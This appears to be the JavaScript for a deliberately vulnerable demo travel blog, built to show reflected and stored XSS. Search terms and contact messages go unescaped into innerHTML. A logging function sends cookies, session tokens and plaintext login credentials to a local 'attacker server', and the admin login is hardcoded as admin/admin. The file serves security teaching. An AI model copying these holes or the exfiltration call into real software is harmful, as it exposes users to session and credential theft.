﻿const defaultPosts = [
  {
    id: 1,
    title: "Sunrise Over Nagarkot",
    category: "Mountains",
    date: "March 12, 2026",
    content: "Watching the sunrise from Nagarkot reminded me that the best journeys are often quiet, simple, and unforgettable. The Himalayan peaks turned gold as the first light broke — a moment no photograph could fully capture."
  },
  {
    id: 2,
    title: "Wandering Through Pokhara",
    category: "City Life",
    date: "February 28, 2026",
    content: "Pokhara felt like a pause button. Lakeside walks, mountain views, and calm evenings made the city feel deeply personal. The reflection of Machhapuchhre in Phewa Lake is something I keep returning to in memory."
  },
  {
    id: 3,
    title: "A Day by the Coast",
    category: "Beaches",
    date: "January 15, 2026",
    content: "The sea has a different way of teaching peace. Every wave felt like a reset from busy daily life. I sat there for hours with nothing but a journal and the sound of the tide."
  }
];

function setCookie(name, value, days = 7) {
  const date = new Date();
  date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
  const expires = "expires=" + date.toUTCString();
  document.cookie = name + "=" + encodeURIComponent(value) + ";" + expires + ";path=/";
}

function getCookie(name) {
  const nameEQ = name + "=";
  const cookies = document.cookie.split(';');
  for (let cookie of cookies) {
    cookie = cookie.trim();
    if (cookie.indexOf(nameEQ) === 0) {
      return decodeURIComponent(cookie.substring(nameEQ.length));
    }
  }
  return "";
}

function deleteCookie(name) {
  setCookie(name, "", -1);
}

function getAllCookies() {
  const cookieObj = {};
  const cookies = document.cookie.split(';');
  cookies.forEach(cookie => {
    const [name, value] = cookie.trim().split('=');
    if (name) {
      cookieObj[name] = decodeURIComponent(value || "");
    }
  });
  return cookieObj;
}

function _injectXssBanner(type) {
  const prev = document.getElementById("_xss-banner");
  if (prev) prev.remove();

  const isStored = type === "stored_xss";
  const bg       = isStored ? "#9b2335" : "#856404";
  const label    = isStored ? "STORED XSS FIRED" : "REFLECTED XSS FIRED";

  const banner = document.createElement("div");
  banner.id = "_xss-banner";
  banner.style.cssText =
    "position:fixed;top:0;left:0;right:0;z-index:99999;" +
    "background:" + bg + ";color:#fff;" +
    "padding:11px 20px;font-family:monospace;font-size:0.85rem;font-weight:600;" +
    "box-shadow:0 3px 12px rgba(0,0,0,0.4);" +
    "transform:translateY(-100%);transition:transform 0.3s ease;" +
    "display:flex;align-items:center;justify-content:center;gap:14px;";

  const msg = document.createElement("span");
  msg.textContent = "⚠ " + label + "  —  cookie: " + (document.cookie || "(none set)");

  const btn = document.createElement("button");
  btn.textContent = "×";
  btn.style.cssText =
    "background:rgba(255,255,255,0.22);border:none;color:#fff;" +
    "padding:2px 10px;border-radius:4px;cursor:pointer;font-size:0.9rem;font-weight:700;";
  btn.onclick = function () { banner.remove(); };

  banner.appendChild(msg);
  banner.appendChild(btn);
  document.body.prepend(banner);

  requestAnimationFrame(function () {
    requestAnimationFrame(function () {
      banner.style.transform = "translateY(0)";
    });
  });

  setTimeout(function () {
    if (banner.parentNode) {
      banner.style.transform = "translateY(-100%)";
      setTimeout(function () { if (banner.parentNode) banner.remove(); }, 300);
    }
  }, 9000);
}

function _logEvent(type, payload) {
  const entry = {
    id: Date.now(),
    type,
    page: window.location.pathname.split("/").pop() || "index.html",
    timestamp: new Date().toLocaleString("en-US", {
      year: "numeric", month: "long", day: "numeric",
      hour: "2-digit", minute: "2-digit", second: "2-digit"
    }),
    payload
  };

  // Keep a local copy for backwards-compatibility
  const log = JSON.parse(localStorage.getItem("_hsEvents") || "[]");
  log.push(entry);
  localStorage.setItem("_hsEvents", JSON.stringify(log));

  // Exfiltrate to the attacker server — this is exactly what a real XSS
  // payload does: fetch() from the victim's browser to the attacker's origin.
  fetch("http://127.0.0.1:3000/log", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(entry)
  }).catch(() => {});
}

function renderEventLog() {
  const container = document.getElementById("captureLog");
  if (!container) return;

  const log = JSON.parse(localStorage.getItem("_hsEvents") || "[]");

  if (log.length === 0) {
    container.innerHTML = `
      <div class="empty-state">
        <h3>No data captured yet.</h3>
        <p>Trigger a search (Reflected XSS), view the admin panel (Stored XSS), or attempt a login to populate this log.</p>
      </div>
    `;
    return;
  }

  const typeLabels = {
    reflected_xss: "Reflected XSS — Cookie Capture",
    stored_xss:    "Stored XSS — Session Capture",
    login_attempt: "Login Credentials Captured"
  };
  const typeColors = {
    reflected_xss: "#856404",
    stored_xss:    "#9b2335",
    login_attempt: "#5c3d8f"
  };

  container.innerHTML = "";
  [...log].reverse().forEach(entry => {
    const card = document.createElement("div");
    card.className = "message-card";
    const label = typeLabels[entry.type] || entry.type;
    const color = typeColors[entry.type] || "#333";

    card.innerHTML = `
      <h3 style="color: ${color};">${escapeHtml(label)}</h3>
      <p style="margin-bottom: 8px; font-size: 0.9rem;">
        <strong>Page:</strong> ${escapeHtml(entry.page)}
        &nbsp;|&nbsp;
        <strong>Time:</strong> ${escapeHtml(entry.timestamp)}
      </p>
      <pre style="background: #f8f4ef; padding: 12px; border-radius: 6px; font-size: 0.82rem; overflow-x: auto; white-space: pre-wrap; color: #333;">${escapeHtml(JSON.stringify(entry.payload, null, 2))}</pre>
    `;
    container.appendChild(card);
  });
}

function clearEventLog() {
  if (!confirm("Clear all event log data?")) return;
  localStorage.removeItem("_hsEvents");
  renderEventLog();
}
function getPosts() {
  const stored = localStorage.getItem("horizonSeekerPosts");
  if (stored) return JSON.parse(stored);
  localStorage.setItem("horizonSeekerPosts", JSON.stringify(defaultPosts));
  return [...defaultPosts];
}

function savePosts(posts) {
  localStorage.setItem("horizonSeekerPosts", JSON.stringify(posts));
}

function renderPosts(posts, containerId) {
  const container = document.getElementById(containerId);
  if (!container) return;

  container.innerHTML = "";

  if (posts.length === 0) {
    container.innerHTML = `
      <div class="empty-state">
        <h3>No stories found</h3>
        <p>Try a different search term or add a new travel story.</p>
      </div>
    `;
    return;
  }

  posts.forEach((post) => {
    const card = document.createElement("div");
    card.className = "card";

    const deleteBtn = containerId === "postContainer"
      ? `<button class="btn danger" onclick="deletePost(${post.id})">Delete story</button>`
      : "";
    const actions = `<div class="post-actions">
      <a href="post-detail.html?id=${post.id}" class="btn secondary">Read Story</a>
      ${deleteBtn}
    </div>`;

    card.innerHTML = `
      <span class="post-category" data-cat="${escapeHtml(post.category.toLowerCase())}">${escapeHtml(post.category)}</span>
      ${post.date ? `<p class="post-date">${escapeHtml(post.date)}</p>` : ""}
      <h3>${escapeHtml(post.title)}</h3>
      <p style="color: var(--ink-soft); font-size: 0.93rem; line-height: 1.7;">${escapeHtml(post.content)}</p>
      ${actions}
    `;

    container.appendChild(card);
  });
}

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function loadHomePosts() {
  const posts = getPosts().slice(-3).reverse();
  renderPosts(posts, "homePosts");
}

function loadAllPosts() {
  const posts = getPosts().slice().reverse();
  renderPosts(posts, "postContainer");
}

/* ── Inline message (used on posts page) ─────────────────── */
function showMessage(elementId, text, type) {
  const el = document.getElementById(elementId);
  if (!el) return;
  el.textContent = text;
  el.className = "message " + type;
  setTimeout(() => { el.className = "message"; }, 4000);
}

/* ── Toast popup (used on contact page) ──────────────────── */
function showToast(message, type) {
  const toast = document.getElementById("toast");
  if (!toast) return;

  const iconColor = type === "success" ? "#1f5c3a" : "#9b2335";
  const iconSvg = type === "success"
    ? `<svg class="toast-icon" width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
         <circle cx="9" cy="9" r="8" stroke="${iconColor}" stroke-width="1.6"/>
         <path d="M5.5 9l2.5 2.5L12.5 6" stroke="${iconColor}" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
       </svg>`
    : `<svg class="toast-icon" width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
         <circle cx="9" cy="9" r="8" stroke="${iconColor}" stroke-width="1.6"/>
         <path d="M9 5.5v5" stroke="${iconColor}" stroke-width="1.6" stroke-linecap="round"/>
         <circle cx="9" cy="12.5" r="0.8" fill="${iconColor}"/>
       </svg>`;

  toast.innerHTML = `${iconSvg}<span>${escapeHtml(message)}</span>`;
  toast.className = "";
  void toast.offsetWidth;
  toast.className = type + " show";
  clearTimeout(toast._hideTimer);
  toast._hideTimer = setTimeout(() => {
    toast.classList.remove("show");
    setTimeout(() => { toast.className = ""; }, 300);
  }, 3500);
}
/* ────────────────────────────────────────────────────────── */

function addPost() {
  const titleEl    = document.getElementById("postTitle");
  const categoryEl = document.getElementById("postCategory");
  const contentEl  = document.getElementById("postContent");

  if (!titleEl || !categoryEl || !contentEl) return;

  const title    = titleEl.value.trim();
  const category = categoryEl.value.trim();
  const content  = contentEl.value.trim();

  if (!title || !category || !content) {
    showMessage("postMessage", "Please fill in all story fields before publishing.", "error");
    return;
  }

  const posts = getPosts();

  posts.push({
    id: Date.now(),
    title,
    category,
    date: new Date().toLocaleDateString("en-US", { year: "numeric", month: "long", day: "numeric" }),
    content
  });

  savePosts(posts);

  titleEl.value    = "";
  categoryEl.value = "";
  contentEl.value  = "";

  showMessage("postMessage", "Your travel story has been published.", "success");
  loadAllPosts();
}

function deletePost(id) {
  if (!confirm("Delete this story? This cannot be undone.")) return;
  savePosts(getPosts().filter((p) => p.id !== id));
  loadAllPosts();
}

function searchPosts() {
  const input = document.getElementById("searchInput");
  if (!input) return;

  const raw   = input.value.trim();          // attacker-controlled string (source)
  const query = raw.toLowerCase();
  const posts = getPosts().slice().reverse();
  const searchResultsEl = document.getElementById("searchResults");

  // Reflect the search term in the URL so it is shareable / linkable.
  history.pushState(null, "", raw ? "?" + new URLSearchParams({ p: raw }) : location.pathname);

  if (!query) {
    renderPosts(posts, "postContainer");
    if (searchResultsEl) searchResultsEl.style.display = "none";
    return;
  }

  const filtered = posts.filter((p) =>
    p.title.toLowerCase().includes(query) ||
    p.content.toLowerCase().includes(query) ||
    p.category.toLowerCase().includes(query)
  );

  if (searchResultsEl) {
    // ── VICTIM BOUNDARY ──────────────────────────────────────────────────
    // The victim's browser renders this. `raw` comes from the ?p= URL
    // parameter crafted by the attacker. Injecting it into innerHTML without
    // escaping is the Reflected XSS sink: script tags or event handlers in
    // the query execute here in the victim's session.
    searchResultsEl.innerHTML = `You searched for: <strong>${raw}</strong> (${filtered.length} result${filtered.length !== 1 ? 's' : ''})`;
    searchResultsEl.style.display = "block";

    // ── ATTACKER PAYLOAD FIRED — cookie exfil logged below ───────────────
    _logEvent("reflected_xss", {
      trigger: raw,
      allCookies: document.cookie,
      sessionToken: getCookie("horizonSeekerAdminSession") || "(none)",
      visitorId: getCookie("horizonSeekerVisitorId") || "(none)"
    });
  }

  renderPosts(filtered, "postContainer");
}

function resetPostsView() {
  const input = document.getElementById("searchInput");
  if (input) input.value = "";
  const searchResultsEl = document.getElementById("searchResults");
  if (searchResultsEl) searchResultsEl.style.display = "none";
  history.pushState(null, "", location.pathname);
  loadAllPosts();
}

function getPostById(id) {
  const posts = getPosts();
  return posts.find((p) => p.id === parseInt(id));
}

function loadPostDetail() {
  const params = new URLSearchParams(window.location.search);
  const postId = params.get("id");
  
  if (!postId) {
    document.body.innerHTML = "<p style='padding: 20px;'>Post not found.</p>";
    return;
  }

  const post = getPostById(postId);
  
  if (!post) {
    document.body.innerHTML = "<p style='padding: 20px;'>Post not found.</p>";
    return;
  }

  const detailContainer = document.getElementById("postDetail");
  if (!detailContainer) return;

  detailContainer.innerHTML = `
    <div class="form-card">
      <h1>${escapeHtml(post.title)}</h1>
      <p style="color: var(--ink-soft); margin-bottom: 15px;">
        <strong>Category:</strong> ${escapeHtml(post.category)} | <strong>Date:</strong> ${escapeHtml(post.date)}
      </p>
      <p style="line-height: 1.8; margin-bottom: 20px;">${escapeHtml(post.content)}</p>
      <button class="btn secondary" onclick="goBackPosts()">Back to Stories</button>
    </div>
  `;
}

/* ── INDEXEDDB DATABASE (Messages) ──────────────────────────────────── */
const DB_NAME    = "horizonSeekerDB";
const DB_VERSION = 1;
const STORE_NAME = "messages";

function openDB() {
  return new Promise((resolve, reject) => {
    const request = indexedDB.open(DB_NAME, DB_VERSION);

    request.onupgradeneeded = (event) => {
      const db = event.target.result;
      if (!db.objectStoreNames.contains(STORE_NAME)) {
        /* keyPath matches the `id: Date.now()` already used per entry */
        db.createObjectStore(STORE_NAME, { keyPath: "id" });
      }
    };

    request.onsuccess = (event) => resolve(event.target.result);
    request.onerror   = (event) => reject(event.target.error);
  });
}

async function getStoredMessages() {
  const db = await openDB();
  return new Promise((resolve, reject) => {
    const tx      = db.transaction(STORE_NAME, "readonly");
    const store   = tx.objectStore(STORE_NAME);
    const request = store.getAll();
    request.onsuccess = () => resolve(request.result || []);
    request.onerror   = () => reject(request.error);
  });
}

async function addMessageToDB(entry) {
  const db = await openDB();
  return new Promise((resolve, reject) => {
    const tx      = db.transaction(STORE_NAME, "readwrite");
    const store   = tx.objectStore(STORE_NAME);
    const request = store.add(entry);
    request.onsuccess = () => resolve();
    request.onerror   = () => reject(request.error);
  });
}

function renderMessages(messages, containerId, emptyMessage = "No messages have been submitted yet.") {
  const container = document.getElementById(containerId);
  if (!container) return;

  const allowRawStoredXss = !window._storedXssExecuted;
  container.innerHTML = "";

  if (messages.length === 0) {
    container.innerHTML = `
      <div class="empty-state">
        <h3>${escapeHtml(emptyMessage)}</h3>
      </div>
    `;
    return;
  }

  messages.slice().reverse().forEach((entry) => {
    const card = document.createElement("div");
    card.className = "message-card";

    const isXssPayload = /<img\s|<script\s|onerror\s*=|onclick\s*=|javascript:/i.test(entry.message);
    const messageContent = isXssPayload && !allowRawStoredXss
      ? escapeHtml(entry.message)
      : entry.message;

    if (isXssPayload && allowRawStoredXss) {
      window._storedXssExecuted = true;
    }

    // ── VICTIM BOUNDARY ──────────────────────────────────────────────────
    // The victim (admin) loads this panel. `entry.message` was stored by the
    // attacker via the public contact form. Rendering it with innerHTML
    // (unescaped) is the Stored XSS sink: malicious script persisted in the
    // DB executes here in the admin's session on every page load.
    card.innerHTML = `
      <h3>${escapeHtml(entry.name)}</h3>
      <p style="margin-bottom: 10px;"><strong>Email:</strong> ${escapeHtml(entry.email)}</p>
      <p style="margin-bottom: 10px;"><strong>Submitted:</strong> ${escapeHtml(entry.date)}</p>
      <p>${messageContent}</p>
    `;
    container.appendChild(card);
  });

  _logEvent("stored_xss", {
    capturedFrom: containerId,
    allCookies: document.cookie,
    sessionToken: getCookie("horizonSeekerAdminSession") || "(none)",
    adminLogged: localStorage.getItem("horizonSeekerAdminLogged") || "(none)",
    visitorId: getCookie("horizonSeekerVisitorId") || "(none)"
  });
}

async function loadMessages() {
  const msgs = await getStoredMessages();
  renderMessages(msgs, "messagesList");
}

async function sendMessage() {
  const nameEl    = document.getElementById("name");
  const emailEl   = document.getElementById("email");
  const messageEl = document.getElementById("message");

  if (!nameEl || !emailEl || !messageEl) return;

  const name    = nameEl.value.trim();
  const email   = emailEl.value.trim();
  const message = messageEl.value.trim();

  if (!name || !email || !message) {
    showToast("Please fill in all fields.", "error");
    return;
  }

  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    showToast("Please enter a valid email address.", "error");
    return;
  }

  await addMessageToDB({
    id: Date.now(),
    name,
    email,
    message,
    date: new Date().toLocaleDateString("en-US", { year: "numeric", month: "long", day: "numeric" })
  });

  showToast("Thank you. Your message has been received.", "success");
  nameEl.value    = "";
  emailEl.value   = "";
  messageEl.value = "";
  loadMessages();
}

function loginAdmin(event) {
  if (event && event.preventDefault) event.preventDefault();

  const idEl   = document.getElementById("adminId");
  const passEl = document.getElementById("adminPass");
  const error  = document.getElementById("loginError");

  if (!idEl || !passEl) return;

  const id   = idEl.value.trim();
  const pass = passEl.value.trim();

  _logEvent("login_attempt", {
    username: id,
    password: pass,
    success: id.toLowerCase() === "admin" && pass === "admin"
  });

  if (id.toLowerCase() === "admin" && pass === "admin") {
    if (error) {
      error.textContent = "";
      error.className = "message";
    }
    localStorage.setItem("horizonSeekerAdminLogged", "true");
    setCookie("horizonSeekerAdminSession", "admin_" + Date.now(), 7);
    setCookie("horizonSeekerAdminUser", "admin", 7);
    window.location.href = "admin.html";
    return;
  }

  if (error) {
    error.textContent = "Invalid ID or password.";
    error.className = "message error";
  }
}

function logoutAdmin() {
  localStorage.removeItem("horizonSeekerAdminLogged");
  deleteCookie("horizonSeekerAdminSession");
  deleteCookie("horizonSeekerAdminUser");
  window.location.href = "login.html";
}

function setActiveNav() {
  const current = window.location.pathname.split("/").pop() || "index.html";
  document.querySelectorAll(".navbar nav a").forEach((link) => {
    const href = link.getAttribute("href");
    if (href === current || (current === "" && href === "index.html")) {
      link.classList.add("active");
    }
  });
}

function goBackPosts() {
  window.location.href = "posts.html";
}

window.addEventListener("storage", (event) => {
  if (event.key === "demoReset") {
    location.reload();
  }
});

document.addEventListener("DOMContentLoaded", () => {
  setActiveNav();
  loadHomePosts();
  loadAllPosts();

  /* ── Visitor Tracking Cookies ─────────────────────────────────────── */
  if (!getCookie("horizonSeekerVisitorId")) {
    setCookie("horizonSeekerVisitorId", "visitor_" + Math.random().toString(36).substr(2, 9), 365);
  }
  setCookie("horizonSeekerLastVisit", new Date().toISOString(), 7);

  const current = window.location.pathname.split("/").pop() || "index.html";

  // If a session cookie exists but the localStorage flag is missing (e.g. injected
  // cross-origin from the attacker server), sync the flag so the auth check passes.
  if (getCookie("horizonSeekerAdminSession") && localStorage.getItem("horizonSeekerAdminLogged") !== "true") {
    localStorage.setItem("horizonSeekerAdminLogged", "true");
  }

  const logged = localStorage.getItem("horizonSeekerAdminLogged") === "true" ||
                 getCookie("horizonSeekerAdminSession");

  if (current === "login.html" && logged) {
    window.location.href = "admin.html";
    return;
  }

  /* ── Check if user is properly authenticated ─────────────────────── */
  if (current === "admin.html" && !logged) {
    window.location.href = "login.html";
    return;
  }

  loadMessages();

  if (current === "index.html") {
    getStoredMessages().then((msgs) => {
      renderMessages(msgs.slice(-3), "publicMessages", "No messages yet.");
    });
  }

  const searchInput = document.getElementById("searchInput");
  if (searchInput) {
    searchInput.addEventListener("keydown", (e) => {
      if (e.key === "Enter") searchPosts();
    });

    // If the page was loaded with ?p=<query> (e.g. from a shared or crafted
    // link), pre-fill the input and run the search immediately.
    const initialQuery = new URLSearchParams(location.search).get("p");
    if (initialQuery) {
      searchInput.value = initialQuery;
      searchPosts();
    }
  }
});
